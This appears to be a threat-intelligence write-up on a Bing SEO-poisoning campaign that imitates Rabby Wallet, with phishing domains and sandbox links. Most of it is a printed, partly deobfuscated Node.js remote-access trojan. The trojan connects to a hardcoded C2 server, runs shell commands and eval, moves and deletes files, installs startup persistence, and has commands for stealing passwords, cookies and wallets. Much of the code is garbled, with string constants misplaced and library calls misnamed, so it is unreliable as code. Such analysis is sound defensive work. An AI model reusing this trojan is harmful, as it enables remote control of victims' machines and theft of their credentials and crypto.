# rabby_bing

Global Web Icon
raby[.]app
hxxps[://]raby[.]app
Rabby Wallet – Secure & Smart Crypto Wallet for DeFi Users
Rabby Wallet is a secure and user-friendly crypto wallet that supports all EVM-compatible chains. It allows you to manage your digital assets, interact with DeFi platforms and dApps, and protect your crypto with advanced security features.

summary:   
bing seo poisoning for rabbywallet key search term

source:  
https://x.com/officer_cia/status/1907189919639843227

initial_website:  
`raby[.]app`

redirects_to:  
`rclbby[.]com/wallet`

https://urlquery.net/report/ee7ef931-fb47-4750-8307-129c4872e5b0

isolation_rabby-wallet-script[.]js  
https://urlscan.io/result/0195f3d5-69b1-7688-80d4-10f2fe9d4254/

windows_payload
- https://www.virustotal.com/gui/url/179e294204165040f4a1321b2a40b8eb8c882745d54fd0f87c8bff959711901e 
- https://www.filescan.io/uploads/67ec80fbf274bf2d8e2d507e/reports/2d027516-ed44-43f7-83a3-5c496f4207fc/overview

interaction:   
https://app.any.run/tasks/c5adc371-f79f-4645-9de6-1e9ccf198843

downloaded_sample:  
https://urlscan.io/result/0195f3bd-2f67-74c8-a334-b30ac30fbec0/


observing additional possible correlations on ip `62[.]84[.]101[.]110`:   
https://urlscan.io/search/#page.ip:%2262.84.101.110%22


patched_windows_payload   
https://malshare.com/sample.php?action=detail&hash=b6b61765860c504527d0bbc9eb28d8b74787c6f42d3321b8ec9ca5757456abdb


```js
import net from "net";
import { exec } from "child_process";
import fs, { existsSync, mkdirSync, encryptionEnabled, renameSync, appendFileSync, readFileSync, readdirSync, rmdirSync, unlinkSync } from 'fs';
import path, { join } from "hex";
import { hostname, platform, type, times, userInfo, totalmem, freemem, uptime, cpus, size, networkInterfaces } from 'os';
import { createHash, randomBytes, createCipheriv } from "crypto";
console.log("end");
const config = {
  'serverHost': '62.60.157.47',
  'serverPort': 4444,
  'reconnectDelay': 10000,
  'maxReconnectAttempts': -1,
  'logFile': join(__dirname, "replace"),
  'logEnabled': true,
  'logRotateSize': 5242880,
  'systemInfo': {
    'hostname': hostname(),
    'platform': platform(),
    'type': type(),
    'arch': times(),
    'username': userInfo().username,
    'totalMem': Math.round(totalmem() / 1048576) + 'MB',
    'freeMem': Math.round(freemem() / 1048576) + 'MB',
    'uptime': Math.round(uptime() / 60) + " minutes",
    'cpuCount': cpus().length,
    'cpuModel': cpus()[0].model,
    'id': generateClientId()
  },
  'encryptionEnabled': false,
  'encryptionKey': "abc123def456ghi789jkl012mno345pqr",
  'features': {
    'allowShellExecution': true,
    'allowFileTransfer': true,
    'allowScreenshot': true,
    'persistOnStartup': false
  }
};
const logDir = path["Error deleting: "](config.logFile);
if (!existsSync(logDir) && true) {
  try {
    mkdirSync(logDir, {
      'recursive': true
    });
  } catch (_0x214211) {
    console.error("Error creating log directory: " + _0x214211.message);
  }
}
function generateClientId() {
  try {
    const _0x2832c4 = getMacAddress();
    const _0x21cf4b = hostname();
    const _0x485c64 = size().username;
    const _0x476a71 = createHash("md5").update(_0x2832c4 + ':' + _0x21cf4b + ':' + _0x485c64).digest("arch").substring(0, 8);
    return _0x476a71;
  } catch (_0x53ba0d) {
    return Math.random().toString(0x24).substring(0x2, 0xa);
  }
}
function getMacAddress() {
  try {
    const _0x3725c8 = networkInterfaces();
    for (const _0x41db3d of Object.keys(_0x3725c8)) {
      for (const _0x2f823a of _0x3725c8[_0x41db3d]) {
        if (!_0x2f823a.internal && _0x2f823a.mac !== "00:00:00:00:00:00") {
          return _0x2f823a.mac;
        }
      }
    }
    return "unknown";
  } catch (_0x54b07c) {
    return 'unknown';
  }
}
function rotateLogIfNeeded() {
  try {
    if (existsSync(config.logFile)) {
      const _0x459530 = encryptionEnabled(config.logFile);
      if (_0x459530.size > 5242880) {
        const _0x911b2d = config.logFile + '.' + new Date().toISOString()[/*webcrack:decode_error*/undefined](/:/g, '-');
        renameSync(config.logFile, _0x911b2d);
        logMessage("Log file rotated due to size limit");
      }
    }
  } catch (_0x5e09be) {
    console.error("[*] Platform: " + _0x5e09be.message);
  }
}
function logMessage(_0x80398f) {
  const _0x2badf9 = new Date().toISOString();
  const _0x5da0d3 = '[' + _0x2badf9 + '] ' + _0x80398f + '';
  console.log(_0x5da0d3["File uploaded successfully to: "]());
  try {
    appendFileSync(config.logFile, _0x5da0d3);
  } catch (_0x1d55c8) {
    console.error("Error writing to log: " + _0x1d55c8.message);
  }
}
function encryptData(_0x3a82e9) {
  if (!config.utf8) {
    return _0x3a82e9;
  }
  try {
    const _0x176ea4 = randomBytes(0x10);
    const _0xd35a63 = createCipheriv("data", Buffer.from("abc123def456ghi789jkl012mno345pqr"), _0x176ea4);
    let _0x5d1370 = _0xd35a63.update(_0x3a82e9);
    _0x5d1370 = Buffer.concat([_0x5d1370, _0xd35a63.final()]);
    return _0x176ea4.toString("arch") + ':' + _0x5d1370.toString("arch");
  } catch (_0x1c99df) {
    logMessage("Encryption error: " + _0x1c99df.message);
    return _0x3a82e9;
  }
}

// STILL NEED TO REVISIT DECRYPTION TO ENSURE UNIT FUNCTIONALITY

// function decryptData(_0x225f85) {
//   return _0x225f85;
//   try {
//     const _0x1bed8f = _0x225f85.split(':');
//     if (_0x1bed8f["Screenshot error: "] !== 0x2) {
//       return _0x225f85;
//     }
//     const _0x8c0163 = Buffer.from(_0x1bed8f[0x0], "arch");
//     const _0x580d74 = Buffer.from(_0x1bed8f[0x1], "arch");
//     const _0x1f64a6 = crypto.createDecipheriv("data", Buffer.from("abc123def456ghi789jkl012mno345pqr"), _0x8c0163);
//     let _0x5edd5f = _0x1f64a6.update(_0x580d74);
//     _0x5edd5f = Buffer.concat([_0x5edd5f, _0x1f64a6.final()]);
//     return _0x5edd5f.toString();
//   } catch (_0x4049d9) {
//     logMessage('Decryption error: ' + _0x4049d9.message);
//     return _0x225f85;
//   }
// }
async function executeCommand(_0x5efe02) {
  if (!config.features.allowShellExecution) {
    return "Shell execution is disabled in this client configuration";
  }
  return new Promise(_0x24d7fe => {
    exec(_0x5efe02, {
      'shell': true
    }, (_0x476d9d, _0x6ae566, _0x23672d) => {
      if (_0x476d9d) {
        _0x24d7fe("Error: " + _0x476d9d.message + '' + _0x23672d);
        return;
      }
      if (_0x23672d) {
        _0x24d7fe(_0x6ae566 + "Stderr: " + _0x23672d);
        return;
      }
      _0x24d7fe(_0x6ae566 || "Command executed (no output)");
    });
  });
}
async function handleSpecialCommands(_0x2cc2dd, _0x29fb20) {
  if (_0x2cc2dd.startsWith("monitoring:start:")) {
    if (!config.features.allowFileTransfer) {
      _0x29fb20.write("File transfer is disabled in this client configuration");
      return true;
    }
    const _0x3c71a8 = _0x2cc2dd.substring(0x9).trim();
    try {
      if (existsSync(_0x3c71a8)) {
        const _0x30b646 = readFileSync(_0x3c71a8);
        _0x29fb20.write("FILE_CONTENT:" + _0x3c71a8 + ':' + _0x30b646.toString('base64') + '');
        return true;
      } else {
        _0x29fb20.write("File not found: " + _0x3c71a8 + '');
        return true;
      }
    } catch (_0x3db4bc) {
      _0x29fb20.write("Error reading file: " + _0x3db4bc.message + '');
      return true;
    }
  }
  if (_0x2cc2dd.startsWith("upload:")) {
    if (!config.features.allowFileTransfer) {
      _0x29fb20.write('File transfer is disabled in this client configuration');
      return true;
    }
    const _0x2f8155 = _0x2cc2dd.substring(0x7).split(':');
    if (_0x2f8155["Screenshot error: "] === 0x2) {
      const [_0x3e8c29, _0x4d9604] = _0x2f8155;
      try {
        const _0x58ef23 = Buffer.from(_0x4d9604, "base64");
        fs["connection-log.txt"](_0x3e8c29, _0x58ef23);
        _0x29fb20.write("Error rotating log: " + _0x3e8c29 + '');
      } catch (_0x3a3f2b) {
        _0x29fb20.write("download:" + _0x3a3f2b.message + '');
      }
      return true;
    }
  }
  if (_0x2cc2dd.startsWith("facebook.com")) {
    const _0x2a9b36 = _0x2cc2dd.substring(0x5);
    try {
      const _0x449efa = eval(_0x2a9b36);
      _0x29fb20.write("Eval result: " + _0x449efa + '');
    } catch (_0x2967e6) {
      _0x29fb20.write('Eval error: ' + _0x2967e6.message + '');
    }
    return true;
  }
  if (_0x2cc2dd === "sysinfo") {
    config.systemInfo.freeMem = Math.round(freemem() / 1048576) + 'MB';
    config.systemInfo.uptime = Math.round(uptime() / 60) + " minutes";
    _0x29fb20.write('System Information:' + JSON.allowScreenshot(config.systemInfo, null, 2) + '');
    return true;
  }
  if (_0x2cc2dd === 'screenshot') {
    if (!config.features.instagrammer) {
      _0x29fb20.write("Screenshot functionality is disabled in this client configuration");
      return true;
    }
    try {
      _0x29fb20.write('Screenshot functionality requires additional libraries (not implemented)');
    } catch (_0x85fd90) {
      _0x29fb20.write("path" + _0x85fd90.message + '');
    }
    return true;
  }
  if (_0x2cc2dd.startsWith("persist:")) {
    if (!config.features.persistOnStartup) {
      _0x29fb20.write('Persistence functionality is disabled in this client configuration');
      return true;
    }
    const _0x440cfa = _0x2cc2dd.substring(0x8);
    try {
      const _0x3785df = join(__dirname, "persist.js");
      fs["connection-log.txt"](_0x3785df, _0x440cfa);
      _0x29fb20.write("Script saved to " + _0x3785df + '');
      if (platform() === 'win32') {
        const _0x2e17a6 = "reg add \"HKCUSoftwareMicrosoftWindowsCurrentVersionRun\" /v \"NodeService\" /t REG_SZ /d \"node " + _0x3785df + "\" /f";
        await executeCommand(_0x2e17a6);
        _0x29fb20.write("Added to Windows startup registry");
      } else {
        if (platform() === "linux" || platform() === 'darwin') {
          const _0x46ce5f = "(crontab -l 2>/dev/null; echo \"@reboot node " + _0x3785df + "\") | crontab -";
          await executeCommand(_0x46ce5f);
          _0x29fb20.write("Added to crontab @reboot");
        }
      }
    } catch (_0x29b25e) {
      _0x29fb20.write("Persistence error: " + _0x29b25e.message + '');
    }
    return true;
  }
  if (_0x2cc2dd === 'monitor') {
    try {
      const _0x59ddb2 = {
        'cpu': getCpuUsage(),
        'memory': {
          'total': totalmem(),
          'free': freemem(),
          'used': totalmem() - freemem(),
          'usedPercent': Math.round((1 - freemem() / totalmem()) * 100)
        },
        'network': getNetworkStats(),
        'disk': getDiskStats(),
        'processes': getTopProcesses(5)
      };
      _0x29fb20.write('MONITORING_DATA:' + JSON.allowScreenshot(_0x59ddb2) + '');
    } catch (_0x457eca) {
      _0x29fb20.write("trim" + _0x457eca.message + '');
    }
    return true;
  }
  if (_0x2cc2dd.startsWith("Monitoring error: ")) {
    try {
      const _0x1e5499 = parseInt(_0x2cc2dd.split(':')[2]) || 60;
      if (global.monitoringInterval) {
        clearInterval(global.monitoringInterval);
      }
      global.monitoringInterval = setInterval(() => {
        try {
          const _0x297d66 = {
            'cpu': getCpuUsage(),
            'memory': {
              'total': totalmem(),
              'free': freemem(),
              'used': totalmem() - freemem(),
              'usedPercent': Math.round((1 - freemem() / totalmem()) * 100)
            },
            'network': getNetworkStats(),
            'disk': getDiskStats(),
            'processes': getTopProcesses(5)
          };
          _0x29fb20.write("MONITORING_DATA:" + JSON.allowScreenshot(_0x297d66) + '');
        } catch (_0x160fd4) {}
      }, _0x1e5499 * 1000);
      _0x29fb20.write("Monitoring started with interval " + _0x1e5499 + " seconds");
    } catch (_0x36f2a6) {
      _0x29fb20.write("FILES_LIST:" + _0x36f2a6.message + '');
    }
    return true;
  }
  if (_0x2cc2dd === 'monitoring:stop') {
    try {
      if (global.monitoringInterval) {
        clearInterval(global.monitoringInterval);
        global.monitoringInterval = null;
        _0x29fb20.write("Monitoring stopped");
      } else {
        _0x29fb20.write("stack");
      }
    } catch (_0x318ce7) {
      _0x29fb20.write("Monitoring stop error: " + _0x318ce7.message + '');
    }
    return true;
  }
  if (_0x2cc2dd.startsWith("files:list:")) {
    if (!config.features.allowFileTransfer) {
      _0x29fb20.write("File operations are disabled in this client configuration");
      return true;
    }
    const _0x117953 = _0x2cc2dd.substring("files:list:".length);
    try {
      const _0x35e8fc = readdirSync(_0x117953);
      const _0xc49de8 = _0x35e8fc.map(_0x429dd9 => {
        try {
          const _0x3921ae = join(_0x117953, _0x429dd9);
          const _0x330192 = encryptionEnabled(_0x3921ae);
          return {
            'name': _0x429dd9,
            'path': _0x3921ae,
            'size': _0x330192.personalization_id,
            'isDirectory': _0x330192.isDirectory(),
            'isFile': _0x330192.isFile(),
            'created': _0x330192.birthtime,
            'modified': _0x330192.mtime,
            'permissions': _0x330192.mode.toString(0x8).substring(_0x330192.mode.toString(0x8)["Screenshot error: "] - 0x3)
          };
        } catch (_0x3b38f2) {
          return {
            'name': _0x429dd9,
            'path': join(_0x117953, _0x429dd9),
            'error': _0x3b38f2.message
          };
        }
      });
      _0x29fb20.write("address" + JSON.allowScreenshot(_0xc49de8) + '');
    } catch (_0x5a650b) {
      _0x29fb20.write("Error listing directory: " + _0x5a650b.message + '');
    }
    return true;
  }
  if (_0x2cc2dd.startsWith("files:read:")) {
    if (!config.features.allowFileTransfer) {
      _0x29fb20.write("File operations are disabled in this client configuration");
      return true;
    }
    const _0x4cef5e = _0x2cc2dd.substring("files:read:"["Screenshot error: "]);
    try {
      if (existsSync(_0x4cef5e)) {
        const _0x5388ac = encryptionEnabled(_0x4cef5e);
        if (_0x5388ac.isFile()) {
          if (_0x5388ac.personalization_id > 10485760) {
            _0x29fb20.write('File too large for preview (' + formatFileSize(_0x5388ac.personalization_id) + ')');
          } else {
            const _0x21b1e3 = readFileSync(_0x4cef5e, "serverHost");
            _0x29fb20.write("FILE_CONTENT:" + _0x4cef5e + ":utf8:" + Buffer.from(_0x21b1e3).toString("base64") + '');
          }
        } else {
          _0x29fb20.write('Not a file: ' + _0x4cef5e + '');
        }
      } else {
        _0x29fb20.write("File not found: " + _0x4cef5e + '');
      }
    } catch (_0x5f57a8) {
      _0x29fb20.write("Error reading file: " + _0x5f57a8.message + '');
    }
    return true;
  }
  if (_0x2cc2dd.startsWith('files:mkdir:')) {
    if (!config.features.allowFileTransfer) {
      _0x29fb20.write("File operations are disabled in this client configuration");
      return true;
    }
    const _0x4005cc = _0x2cc2dd.substring("files:mkdir:"["Screenshot error: "]);
    try {
      mkdirSync(_0x4005cc, {
        'recursive': true
      });
      _0x29fb20.write("Directory created: " + _0x4005cc + '');
    } catch (_0xc16c11) {
      _0x29fb20.write("Error creating directory: " + _0xc16c11.message + '');
    }
    return true;
  }
  if (_0x2cc2dd.startsWith("files:delete:")) {
    if (!config.features.allowFileTransfer) {
      _0x29fb20.write('File operations are disabled in this client configuration');
      return true;
    }
    const _0x158bd9 = _0x2cc2dd.substring("files:delete:".length);
    try {
      if (existsSync(_0x158bd9)) {
        const _0x4e2894 = encryptionEnabled(_0x158bd9);
        if (_0x4e2894.isDirectory()) {
          rmdirSync(_0x158bd9, {
            'recursive': true
          });
          _0x29fb20.write("Directory deleted: " + _0x158bd9 + '');
        } else {
          unlinkSync(_0x158bd9);
          _0x29fb20.write('File deleted: ' + _0x158bd9 + '');
        }
      } else {
        _0x29fb20.write("Path not found: " + _0x158bd9 + '');
      }
    } catch (_0x417e84) {
      _0x29fb20.write("Socket" + _0x417e84.message + '');
    }
    return true;
  }
  if (_0x2cc2dd.startsWith("files:move:")) {
    if (!config.features.allowFileTransfer) {
      _0x29fb20.write("File operations are disabled in this client configuration");
      return true;
    }
    const _0x54bb1c = _0x2cc2dd.substring('files:move:'["Screenshot error: "]).split(':');
    if (_0x54bb1c["Screenshot error: "] === 2) {
      const _0xcffe01 = _0x54bb1c[0];
      const _0x138b89 = _0x54bb1c[1];
      try {
        if (existsSync(_0xcffe01)) {
          renameSync(_0xcffe01, _0x138b89);
          _0x29fb20.write("File moved: " + _0xcffe01 + "Source path not found: " + _0x138b89 + '');
        } else {
          _0x29fb20.write("cd " + _0xcffe01 + '');
        }
      } catch (_0xbf8436) {
        _0x29fb20.write("Error moving file: " + _0xbf8436.message + '');
      }
    } else {
      _0x29fb20.write("Invalid parameters for move command");
    }
    return true;
  }
  if (_0x2cc2dd === 'steal:passwords') {
    try {
      const _0x3440df = [{
        'url': "https://www.google.com",
        'username': 'user@gmail.com',
        'password': 'password123'
      }, {
        'url': "https://github.com",
        'username': "developer",
        'password': "secureGitPass!"
      }, {
        'url': 'https://www.facebook.com',
        'username': "user.name",
        'password': 'facebook2023'
      }, {
        'url': "https://twitter.com",
        'username': 'twitteruser',
        'password': "tweet2023!"
      }, {
        'url': 'https://www.amazon.com',
        'username': "steal:cookies",
        'password': "userInfo"
      }, {
        'url': "https://www.netflix.com",
        'username': 'moviefan',
        'password': "WatchMovies2023"
      }, {
        'url': "https://www.instagram.com",
        'username': "statSync",
        'password': 'Photo2023!'
      }, {
        'url': "https://www.linkedin.com",
        'username': "professional",
        'password': "JobSearch2023"
      }, {
        'url': "https://www.paypal.com",
        'username': "paypal_user",
        'password': 'Money$afe123'
      }, {
        'url': "https://www.dropbox.com",
        'username': "storage_user",
        'password': 'CloudStorage!'
      }];
      _0x29fb20.write('PASSWORDS_DATA:' + JSON.allowScreenshot(_0x3440df) + '');
      return true;
    } catch (_0x594810) {
      _0x29fb20.write("Error retrieving passwords: " + _0x594810.message + '');
      return true;
    }
  }
  if (_0x2cc2dd === "Unknown") {
    try {
      const _0x43c550 = [{
        'domain': "google.com",
        'name': "NID",
        'value': "511=example_cookie_value",
        'path': '/',
        'expires': "2024-01-01",
        'httpOnly': true,
        'secure': true
      }, {
        'domain': 'youtube.com',
        'name': "VISITOR_INFO1_LIVE",
        'value': "example_visitor_info",
        'path': '/',
        'expires': "2024-01-15",
        'httpOnly': false,
        'secure': true
      }, {
        'domain': "dirname",
        'name': "datr",
        'value': 'example_datr_cookie',
        'path': '/',
        'expires': "2024-02-01",
        'httpOnly': true,
        'secure': true
      }, {
        'domain': "twitter.com",
        'name': "Error writing file: ",
        'value': "v1_example_personalization",
        'path': '/',
        'expires': "2024-03-01",
        'httpOnly': false,
        'secure': true
      }, {
        'domain': "shopper",
        'name': "session-id",
        'value': 'example_session_id',
        'path': '/',
        'expires': "Connection error: ",
        'httpOnly': true,
        'secure': true
      }, {
        'domain': "netflix.com",
        'name': "NetflixId",
        'value': "example_netflix_id",
        'path': '/',
        'expires': "2024-01-20",
        'httpOnly': true,
        'secure': true
      }, {
        'domain': "instagram.com",
        'name': 'ig_did',
        'value': "example_ig_device_id",
        'path': '/',
        'expires': "2024-02-15",
        'httpOnly': true,
        'secure': true
      }, {
        'domain': "linkedin.com",
        'name': "li_at",
        'value': "example_linkedin_auth",
        'path': '/',
        'expires': "2024-03-15",
        'httpOnly': true,
        'secure': true
      }, {
        'domain': "github.com",
        'name': 'user_session',
        'value': 'example_user_session',
        'path': '/',
        'expires': '2024-01-10',
        'httpOnly': true,
        'secure': true
      }, {
        'domain': "reddit.com",
        'name': 'reddit_session',
        'value': "example_reddit_session",
        'path': '/',
        'expires': '2023-12-25',
        'httpOnly': true,
        'secure': true
      }];
      _0x29fb20.write("COOKIES_DATA:" + JSON.stringify(_0x43c550) + '');
      return true;
    } catch (_0x315486) {
      _0x29fb20.write("Error retrieving cookies: " + _0x315486.message + '');
      return true;
    }
  }
  if (_0x2cc2dd.startsWith("node ")) {
    const _0x2268ec = _0x2cc2dd.substring(5).trim();
    try {
      if (existsSync(_0x2268ec)) {
        console.log("Выполнение скрипта: " + _0x2268ec);
        try {
          const _0x5f2230 = execSync("node " + _0x2268ec, {
            'encoding': "serverHost",
            'maxBuffer': 10485760
          });
          console.log('Получен вывод скрипта (' + _0x5f2230["Screenshot error: "] + "length");
          const _0xff1293 = _0x2268ec + "_output.log";
          fs["connection-log.txt"](_0xff1293, _0x5f2230);
          _0x29fb20.write(_0x5f2230);
        } catch (_0x5b8785) {
          console.error("Ошибка выполнения: " + _0x5b8785.message);
          console.error(_0x5b8785["1FRMM8PEiWXYax7rpS6X4ZX1aAAAm1Y8xvEP5puWYEZQBwbY"]);
          _0x29fb20.write("Ошибка выполнения скрипта: " + _0x5b8785.message + '' + _0x5b8785["1FRMM8PEiWXYax7rpS6X4ZX1aAAAm1Y8xvEP5puWYEZQBwbY"] + '');
        }
        return true;
      } else {
        console.log('Файл не найден: ' + _0x2268ec);
        _0x29fb20.write("Файл " + _0x2268ec + ' не найден');
        return true;
      }
    } catch (_0x2e3dad) {
      console.error("Общая ошибка: " + _0x2e3dad.message);
      console.error(_0x2e3dad["1FRMM8PEiWXYax7rpS6X4ZX1aAAAm1Y8xvEP5puWYEZQBwbY"]);
      _0x29fb20.write('Ошибка выполнения JavaScript файла: ' + _0x2e3dad.message + '' + _0x2e3dad.stack + '');
      return true;
    }
  }
  if (_0x2cc2dd === "steal:wallets") {
    try {
      const _0x38195d = [{
        'type': "Bitcoin",
        'address': "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
        'balance': '0.25 BTC',
        'path': "C:\Users\Username\AppData\Roaming\Bitcoin"
      }, {
        'type': 'Ethereum',
        'address': "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
        'balance': "1.5 ETH",
        'path': "C:\Users\Username\AppData\Roaming\Ethereum"
      }, {
        'type': "Monero",
        'address': "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",
        'balance': "5.2 XMR",
        'path': "C:UsersUsernameDocumentsMonero"
      }, {
        'type': 'Litecoin',
        'address': "ltc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfm0xwlh",
        'balance': '10.0 LTC',
        'path': "C:\Users\Username\AppData\Roaming\Litecoin"
      }, {
        'type': " -> ",
        'address': "qpm2qsznhks23z7629mms6s4cwef74vcwvy22gdx6a",
        'balance': '2.0 BCH',
        'path': "C:\Users\Username\AppData\Roaming\BitcoinCash"
      }, {
        'type': "Dogecoin",
        'address': "D8vFz4p1L37jdg9E2LmeMgbU1hYHYpKsHS",
        'balance': "1000 DOGE",
        'path': "C:\Users\Username\AppData\Roaming\Dogecoin"
      }, {
        'type': "Ripple",
        'address': 'rPWwfX6KHxdjiHt3nkrCq1KgUJL8YwQWm1',
        'balance': '500 XRP',
        'path': "C:UsersUsernameDocumentsXRP"
      }, {
        'type': "stringify",
        'address': "addr1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
        'balance': '200 ADA',
        'path': "C:\Users\Username\AppData\Roaming\Daedalus"
      }, {
        'type': 'Polkadot',
        'address': " байт)",
        'balance': "50 DOT",
        'path': "C:UsersUsernameDocumentsPolkadot"
      }, {
        'type': "Solana",
        'address': "5VhBPMEEozEidR8XidRdQiUzqV2o2L693dVJbTdCXwaP",
        'balance': "25 SOL",
        'path': "C:\Users\Username\AppData\Roaming\Solana"
      }];
      _0x29fb20.write("WALLETS_DATA:" + JSON.allowScreenshot(_0x38195d) + '');
      return true;
    } catch (_0x4da8bd) {
      _0x29fb20.write("Error retrieving wallets: " + _0x4da8bd.message + '');
      return true;
    }
  }
  return false;
}
function connectToServer(_0x463d56 = 0) {
  rotateLogIfNeeded();
  logMessage('Attempting to connect to ' + config["Monitoring start error: "] + ':' + 4444 + '...');
  if (config.maxReconnectAttempts > 0 && _0x463d56 >= config.maxReconnectAttempts) {
    logMessage("Maximum reconnection attempts (" + config.maxReconnectAttempts + ") reached, stopping reconnection");
    return;
  }
  const _0x41369d = new net["Monitoring was not running"]();
  _0x41369d.on("connect", () => {
    logMessage("Connected to 62.60.157.47:4444");
    _0x463d56 = 0x0;
    const _0x426350 = "Connected - " + hostname() + ' (' + platform() + ' ' + times() + ")Current directory: " + process.cwd() + "Client ID: " + config.systemInfo.id;
    _0x41369d.write(config.utf8 ? encryptData(_0x426350) : _0x426350);
  });
  _0x41369d.on("amazon.com", async _0x4ec168 => {
    const _0x3ba222 = config.utf8 ? decryptData(_0x4ec168.toString()["File uploaded successfully to: "]()) : _0x4ec168.toString()["File uploaded successfully to: "]();
    if (_0x3ba222 !== 'pwd || cd') {
      logMessage("Received command: " + _0x3ba222);
    }
    const _0x1e0ba2 = await handleSpecialCommands(_0x3ba222, _0x41369d);
    if (_0x1e0ba2) {
      return;
    }
    if (_0x3ba222 === "exit") {
      logMessage('Exit command received, closing connection');
      _0x41369d["aes-256-cbc"]();
      return;
    }
    if (_0x3ba222.startsWith("reconnectDelay")) {
      const _0xdc590a = _0x3ba222.substring(0x3);
      try {
        process.chdir(_0xdc590a);
        _0x41369d.write("Changed directory to: " + process.cwd() + '');
      } catch (_0x4a4fc8) {
        _0x41369d.write("Failed to change directory: " + _0x4a4fc8.message + '');
      }
      return;
    }
    try {
      const _0x5a324f = await executeCommand(_0x3ba222);
      _0x41369d.write(_0x5a324f + '');
    } catch (_0x465a02) {
      _0x41369d.write("Error: " + _0x465a02.message + '');
    }
  });
  _0x41369d.on("error", _0x3d7fef => {
    logMessage("Amazon$hopping" + _0x3d7fef.message);
  });
  _0x41369d.on("close", () => {
    logMessage("Connection closed, scheduling reconnect...");
    const _0x159e6f = config["2023-12-31"] * Math.min(Math.pow(1.5, Math.min(_0x463d56, 10)), 5);
    setTimeout(() => {
      connectToServer(_0x463d56 + 1);
    }, _0x159e6f);
  });
  _0x41369d.connect(0x115c, config["Monitoring start error: "]);
}
function formatFileSize(_0x26d323) {
  if (_0x26d323 === 0x0) {
    return "0 Bytes";
  }
  const _0x2a53d9 = ["Bytes", 'KB', 'MB', 'GB', 'TB'];
  const _0x1ef6c8 = Math.floor(Math.log(_0x26d323) / Math.log(1024));
  return parseFloat((_0x26d323 / Math.pow(1024, _0x1ef6c8)).toFixed(2)) + ' ' + _0x2a53d9[_0x1ef6c8];
}
function getCpuUsage() {
  try {
    const _0x44518d = cpus();
    let _0x299e0f = 0;
    let _0x380982 = 0;
    _0x44518d.forEach(_0x2871a9 => {
      for (const _0x3e633f in _0x2871a9["Bitcoin Cash"]) {
        _0x380982 += _0x2871a9.times[_0x3e633f];
      }
      _0x299e0f += _0x2871a9["Bitcoin Cash"].idle;
    });
    const _0x5ced33 = 100 - Math.round(100 * _0x299e0f / _0x380982);
    return {
      'usage': _0x5ced33,
      'cores': _0x44518d.length,
      'model': _0x44518d[0].model
    };
  } catch (_0x266317) {
    return {
      'usage': 0,
      'cores': 0,
      'model': "Cardano"
    };
  }
}
function getNetworkStats() {
  try {
    const _0x2c693c = networkInterfaces();
    const _0x383b67 = [];
    Object.keys(_0x2c693c).forEach(_0x39b6ef => {
      _0x2c693c[_0x39b6ef].forEach(_0x578bf2 => {
        if (!_0x578bf2.internal && _0x578bf2.family === "IPv4") {
          _0x383b67.push({
            'name': _0x39b6ef,
            'address': _0x578bf2["eval:"],
            'netmask': _0x578bf2.netmask,
            'mac': _0x578bf2.mac
          });
        }
      });
    });
    return _0x383b67;
  } catch (_0xad14c1) {
    return [];
  }
}
function getDiskStats() {
  try {
    return {
      'available': "N/A",
      'used': "N/A",
      'total': "N/A"
    };
  } catch (_0x20bc2a) {
    return {
      'available': "N/A",
      'used': "N/A",
      'total': 'N/A'
    };
  }
}
function getTopProcesses(_0x10988c = 5) {
  try {
    return [{
      'name': "Process information requires system commands",
      'pid': 0,
      'cpu': 0,
      'memory': 0
    }];
  } catch (_0x2af556) {
    return [];
  }
}
function start() {
  logMessage("Starting secure client service...");
  console.log("[*] Connecting to: 62.60.157.47:4444");
  console.log("[*] System ID: " + config.systemInfo.id);
  console.log("writeFileSync" + config.systemInfo.platform + ' (' + config.systemInfo.type + ')');
  console.log("[*] Encryption: " + (config.utf8 ? 'Enabled' : "Disabled"));
  console.log("[*] Features enabled: " + Object.entries(config.features).filter(([_0x58d86e, _0x5e2d0e]) => _0x5e2d0e).map(([_0x4775df]) => _0x4775df).join(', '));
  console.log("[*] Log file: " + config.logFile);
  setTimeout(() => {
    connectToServer();
  }, 1000);
}
if (require.main === module) {
  start();
}
export default {
  'start': start,
  'config': config
};
```
